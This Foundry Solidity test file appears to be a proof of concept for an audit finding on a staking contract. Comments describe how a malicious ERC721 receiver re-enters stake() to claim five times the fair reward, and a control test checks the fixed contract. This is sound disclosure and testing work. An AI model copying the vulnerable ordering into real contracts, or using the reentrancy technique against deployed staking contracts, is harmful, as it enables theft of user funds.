// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    MiniToken,
    StakingERC721,
    StakingERC721Fixed,
    MaliciousStaker,
    IStaking
} from "./59357-malicious-user-can-drain-rewards-through-reentrancy-in-sta.sol";

// Zero Staking 59357: StakingERC721.stake() updates lastUpdatedTimestamp only
// after _safeMint. A malicious receipt receiver re-enters stake() during the
// onERC721Received callback, re-crediting the same stale elapsed window and
// inflating claimable rewards — real reward-token theft.
contract PoC_59357_ReentrancyRewardTheft is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant STAKE_AMT = 1e18;
    uint256 internal constant ELAPSED = 1000;

    function test_exploit_reentrancy_inflatesRewards() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken rewardToken = e.rewardToken();

        // Honest single-window accrual = 1000 * 1e18 * 1 = 1000e18.
        assertEq(e.fairRewards(), 1000 ether, "fair single-window reward");
        // 4 reentrant re-credits → 5x total = 5000e18 claimed.
        assertEq(e.exploitRewards(), 5000 ether, "reentrancy-inflated reward");
        assertEq(e.stolenExtra(), 4000 ether, "extra rewards stolen over fair");

        // The stolen reward tokens land on the attacker EOA.
        assertEq(rewardToken.balanceOf(ATTACKER), 5000 ether, "attacker receives inflated rewards");

        emit log_named_decimal_uint("fair rewards     ", e.fairRewards(), 18);
        emit log_named_decimal_uint("claimed (exploit)", e.exploitRewards(), 18);
        emit log_named_decimal_uint("stolen extra     ", e.stolenExtra(), 18);

        // Attacker claimed 5x the honest amount purely via reentrancy.
        assertEq(e.exploitRewards(), e.fairRewards() * 5, "exploit yields exactly 5x fair");
        assertGt(e.stolenExtra(), 0, "theft occurred");
    }

    // Control: the fixed staking finalizes lastUpdatedTimestamp BEFORE _safeMint,
    // so the SAME reentrant attacker accrues only the honest single window.
    function test_control_fixedStaking_noInflation() public {
        MiniToken rewardToken = new MiniToken("RWD");
        StakingERC721Fixed staking = new StakingERC721Fixed(rewardToken);
        MaliciousStaker attacker = new MaliciousStaker(IStaking(address(staking)));

        rewardToken.mint(address(staking), 1_000_000 ether);

        attacker.initialStake(STAKE_AMT);
        staking.advanceTime(ELAPSED);

        // Attacker attempts the identical reentrancy cascade against the fix.
        attacker.exploitStake();
        attacker.claim();

        uint256 claimed = rewardToken.balanceOf(address(attacker));
        emit log_named_decimal_uint("fixed staking claimed", claimed, 18);

        // The fix ignores the reentrant credits: only the fair 1000e18 accrues.
        assertEq(claimed, 1000 ether, "fixed staking yields only the fair amount");
    }
}
